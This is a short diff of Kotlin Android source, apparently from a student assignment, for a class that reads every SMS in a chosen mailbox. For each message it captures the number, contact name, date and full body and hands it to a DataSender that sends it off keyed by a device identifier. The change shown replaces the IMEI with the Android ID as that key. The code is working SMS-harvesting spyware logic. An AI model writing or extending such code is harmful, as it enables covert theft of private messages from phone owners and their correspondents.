@@ -6,7 +6,7 @@ import com.example.assignment1.DataSender
 import java.util.*
 
 
-class smsLog(var context: Context, var imei: String) {
+class smsLog(var context: Context, var androidid: String) {
     fun readSMSBox(box: String) {
         var datasender = DataSender()
         val SMSURI = Uri.parse("content://sms/$box")
@@ -22,7 +22,7 @@ class smsLog(var context: Context, var imei: String) {
                     val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                     val fi =
                         "#$iterator\nNumber : $number\nPerson : $person\nDate : $fDate\nBody : $body\n"
-                    datasender.sendData(imei, fi)
+                    datasender.sendData(androidid, fi)
                     cur.moveToNext()
                 }
             }
